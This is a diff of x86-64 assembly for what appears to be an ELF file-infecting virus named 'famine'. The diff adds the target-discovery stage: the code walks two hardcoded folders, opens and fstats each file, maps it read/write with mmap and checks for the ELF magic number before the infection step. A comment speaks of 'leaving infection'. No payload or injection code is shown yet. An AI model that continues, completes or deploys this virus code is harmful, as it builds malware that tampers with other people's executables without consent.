@@ -8,22 +8,18 @@ section .text
 
 _famine:
     ; maybe push ALL USEFULL REGISTERS to restore state before leaving infection
-    push rbp
+    PUSH
     mov rbp, rsp
     rel_init
-    sub rsp, FILE_SIZE + DIRENT + FSTAT
-    mov r10, 1
+    sub rsp, FILE_SIZE + DIRENT + FSTAT + MAPPED_FILE
+    mov r14, 1
 
 target_dir:
-    cmp r10, 1
-    je .f1
-    cmp r10, 0
-    je .f2
     .f1:
         lea rdi, [rel(hook.folder_1)]
         jmp open_dir
     .f2:
-        mov r10, 0
+        mov r14, 0
         lea rdi, [rel(hook.folder_2)]
 
 open_dir:
@@ -59,9 +55,9 @@ target_file:
     ; push qword [rbx]
     mov rax, rdi
     lea rdi, [rsp]
-    cmp r10, 1
+    cmp r14, 1
     je .ff1
-    cmp r10, 0
+    cmp r14, 0
     je .ff2
     .ff1:
         lea rsi, [rel(hook.folder_1)]
@@ -90,7 +86,6 @@ target_file:
     dbgs [rel(hook.target)], [rsp]
 %endif
 
-
 validate_target:
     lea rdi, [rsp]                                      ; filename
     mov rax, SYS_OPEN
@@ -99,14 +94,42 @@ validate_target:
     cmp al, 0
     jle next_file
     mov rdi, rax
+    mov r15, rax
     mov rsi, rsp
     add rsi, FILE_SIZE + DIRENT
     mov rax, SYS_FSTAT
     syscall
     cmp rax, 0
-    jl next_file
+    jne next_file
 %ifdef DEBUG
     dbg [rel(hook.fz)], [rsp + FILE_SIZE + DIRENT + 48] ; st_size
+%endif
+
+map_target:
+    push r8                                                 ; save dirent size
+    mov rdi, 0x0
+    mov rsi, QWORD [rsp + FILE_SIZE + DIRENT + 48 + 8]      ; filesz
+    mov rdx, 0x3                                            ; READ | WRITE
+    mov r10, 0x0002                                         ; MAP_PRIVATE
+    mov r8, r15                                             ; fd
+    mov r9, 0                                               ; starting at offset 0
+    mov rax, 9
+    syscall
+    mov [rbp - 16], rax                                     ; store mapped file
+    pop r8                                                  ; restore dirent size
+
+elf_header:
+    mov rsi, [rbp - 16]
+    cmp dword [rsi], 0x464c457f                             ; 7fELF
+    jne next_file
+
+    ; mov ax, word [rsi + Elf64_Ehdr.e_type]               ; We need to check for ET_EXEC or ET_DYN
+%ifdef DEBUG
+    mov rsi, [rbp - 16]
+    movzx rsi, word [rsi + Elf64_Ehdr.e_type] 
+
+    ; movzx rax, word [rsi + Elf64_Ehdr.e_type] 
+    dbg [rel(hook.e_type)], rsi
 %endif
 
 next_file:
@@ -122,14 +145,16 @@ next_dir:
     mov rcx, rbx                    ; maybe push RBX before
     memset [rsp + 256], rcx         ; DIRENT_BUF memset
     .next:
-        cmp r10, 1
+        cmp r14, 1
         jge target_dir.f2
 
 quit:
-    mov rax, SYS_EXIT
+    add rsp, FILE_SIZE + DIRENT + FSTAT + MAPPED_FILE
+    POP
+
+    mov rax, SYS_EXIT 
     mov rdi, 0
     syscall
-
 hook:
     .folder_1:
         db FOLDER_1, 0
@@ -142,6 +167,8 @@ hook:
         db "Filesize : 0x%x", 0xa, 0
     .target:
         db "Target_file : %s", 0xa, 0
+    .e_type:
+        db "e_type : %x", 0xa, 0
     .string:
         db "%s", 0xa, 0
     .number:
